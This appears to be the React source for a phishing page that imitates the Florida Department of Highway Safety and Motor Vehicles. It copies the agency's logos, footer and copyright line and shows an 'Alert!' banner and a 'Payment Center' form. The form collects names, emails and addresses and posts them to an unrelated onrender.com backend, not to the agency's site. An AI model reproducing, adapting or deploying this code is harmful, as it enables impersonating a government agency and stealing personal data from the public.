import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "./style.css";

export default function FLHSMVPage() {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    phone: "",
    subject: "",
    message: "",
  });

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    await fetch("https://flhsmv-backend.onrender.com/backend/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(formData),
    });
    navigate("/home1");
  };

  return (
    <div>
      <nav className="container" id="orange">Alert!</nav>
      <header className="site-header">
        <div className="top-bar">
          <img src="flhsmv.png" id="flhsmv" alt="FLHSMV logo" />
        </div>
        <nav className="main-nav">
          <div className="menu-toggle">
            <span className="menu-icon">&#9776;</span>
            <strong>Menu</strong>
          </div>
          <ul className="dropdown-menu"></ul>
        </nav>
      </header>

      <section className="email-form">
        <h2>Payment Center</h2>
        <form onSubmit={handleSubmit}>
          <label htmlFor="name">Full Name</label>
          <input type="text" id="name" name="name" required onChange={handleChange} />

          <label htmlFor="email">Email</label>
          <input type="email" id="email" name="email" required onChange={handleChange} />

          <label htmlFor="phone">City</label>
          <input type="tel" id="phone" name="phone" onChange={handleChange} />

          <label htmlFor="subject">State/Province/Region</label>
          <input type="text" id="subject" name="subject" onChange={handleChange} />

          <label htmlFor="message">ZIP / Postal Code</label>
          <input type="text" name="message" required onChange={handleChange} />

          <button type="submit">Submit</button>
        </form>
      </section>

      <footer id="footer">
        <div className="overflow">
          <img src="flhsmv2.png" id="flhsmv2" alt="FLHSMV Secondary Logo" />
          <ul id="footer-navigation" className="list-unstyled">
            <li><a href="/privacy-statement/"><span>Privacy Statement</span></a></li>
            <li><a href="/email-notice/"><span>Email Notice</span></a></li>
            <li className="active"><a href="/disclaimer/"><span>Disclaimer</span></a></li>
            <li className="myflorida">
              <a target="_blank" rel="noopener noreferrer" href="http://www.myflorida.com">
                <span>MyFlorida.com</span>
              </a>
            </li>
            <li><a href="/ada-notice/"><span>ADA Notice</span></a></li>
            <li>
              <a href="https://www.flhsmv.gov/contact-us/?utm_source=internal&utm_medium=none&utm_campaign=Footer&utm_content=contactus">
                <span>Contact Us</span>
              </a>
            </li>
          </ul>
          <p className="copy">© Copyright 2014 – 2025 Florida Department of Highway Safety and Motor Vehicles. All Rights Reserved.</p>
        </div>
      </footer>
    </div>
  );
}
